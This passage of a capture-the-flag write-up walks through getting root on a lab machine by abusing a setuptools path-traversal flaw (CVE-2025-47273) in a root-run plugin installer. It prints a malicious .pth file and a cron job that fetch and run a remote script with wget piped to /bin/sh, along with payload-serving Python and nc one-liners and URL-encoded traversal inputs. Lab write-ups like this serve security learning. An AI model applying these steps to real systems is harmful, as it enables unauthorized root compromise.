    install_validator_plugin(plugin_url)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo).")
        sys.exit(1)
    main()
```
{:filename="sudo python script.py"}

This python script is using a version of `setuptools` which is vulnerable to [CVE-2025-47273](https://github.com/pypa/setuptools/security/advisories/GHSA-5rjg-fvgr-3xxf). Since the script uses the `download_url` method from `setuptools` which uses `os.path.join(tmpdir,name)`. If `name` starts with a `/` we're able to bypass the `tmpdir` argument and have it write to any directory we determine. It is also important to note that in the function it takes in the `url` as the first argument and the `tmpdir` as the second argument while `os.path.join` does it the other way around. We can locate the following [PoC](https://github.com/pypa/setuptools/issues/4946) which simply uses `url encoding` to inject the filename.
### PTH Method
Let's write a malicious `pth` file that we'll put in the `dist-packages` library so that when we re-run the setup it will execute any lines in the `pth` file starting with `import`. Let's create `w1ld.pth`
```python
import os; os.system('wget http://10.10.14.9:3232/ra.sh -S -O -|/bin/sh')
```
{:filename="malicious pth.sh"}

Next we have to serve it with any request, so I'll create a simple `python` server.
```python
import http.server, socketserver; 
class H(http.server.SimpleHTTPRequestHandler): 
    def do_GET(s): s.send_response(200); s.end_headers(); s.wfile.write(open('w1ld.pth', 'rb').read()); 
socketserver.TCPServer(('', 80), H).serve_forever()
```
{:filename="malicious file server.py"}

Let's run `server.py`
```bash
$ python3 server.py                     
```
{:filename="malicious file server.py"}

Finally let's upload the file using a file traversal file write payload.
```bash
steve@variatype:/opt/font-tools/validators$ sudo python3 /opt/font-tools/install_validator.py 'http://10.10.14.9/%2Fusr%2Flocal%2Flib%2Fpython3.11%2Fdist-packages%2Fw1ld.pth'
2026-03-16 02:23:58,319 [INFO] Attempting to install plugin from: http://10.10.14.9/%2Fusr%2F%2Flocal%2Flib%2Fpython3.11%2Fdist-packages%2Fw1ld.pth
2026-03-16 02:23:58,326 [INFO] Downloading http://10.10.14.9/%2Fusr%2F%2Flocal%2Flib%2Fpython3.11%2Fdist-packages%2Fw1ld.pth
2026-03-16 02:23:58,386 [INFO] Plugin installed at: /usr/local/lib/python3.11/dist-packages/w1ld.pth
[+] Plugin installed successfully.
```
{:filename="malicious file server.py"}

If we run it again it executes our payload and just like that we have a callback on our listener.
```bash
root@variatype:/opt/font-tools/validators# id
uid=0(root) gid=0(root) groups=0(root)
root@variatype:/opt/font-tools/validators# whoami
root
```
{:filename="root.sh"}

Just like that, we have Root!

### Cron Method
Another method to do this exploit it to simply write a cron script.
```bash
* * * * * root /tmp/w1ld.sh
```

Which executes the following shell script.
```bash
#!/bin/bash
wget http://10.10.14.9:3232/ra.sh -S -O - | /bin/sh
```

Which we can then serve with the following `server.py`
```python
import http.server, socketserver; 
class H(http.server.SimpleHTTPRequestHandler): 
    def do_GET(s): s.send_response(200); s.end_headers(); s.wfile.write(open('w1ld.cron', 'rb').read()); 
socketserver.TCPServer(('', 80), H).serve_forever()
```

Next let's execute the `Arbitrary File Write`
```bash
steve@variatype:/tmp$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.14.9/%2Fetc%2Fcron.d%2Fw1ld
2026-03-16 03:02:24,256 [INFO] Attempting to install plugin from: http://10.10.14.9/%2Fetc%2Fcron.d%2Fw1ld
2026-03-16 03:02:24,262 [INFO] Downloading http://10.10.14.9/%2Fetc%2Fcron.d%2Fw1ld
2026-03-16 03:02:24,319 [INFO] Plugin installed at: /etc/cron.d/w1ld
[+] Plugin installed successfully.
```

After waiting for a minute we get a callback on our listener as root.
```bash
root@variatype:~# id && whoami
uid=0(root) gid=0(root) groups=0(root)
root
```

### Simple NC Server Method
Instead of using `python` to create an `HTTP` server we can also use the following `nc` oneliner replacing `w1ld` with whatever file we'd like to serve.
```bash
{ printf "HTTP/1.1 200 OK\r\nContent-Length: $(wc -c < w1ld)\r\nConnection: close\r\n\r\n"; cat w1ld; } | nc -lvnp 80
```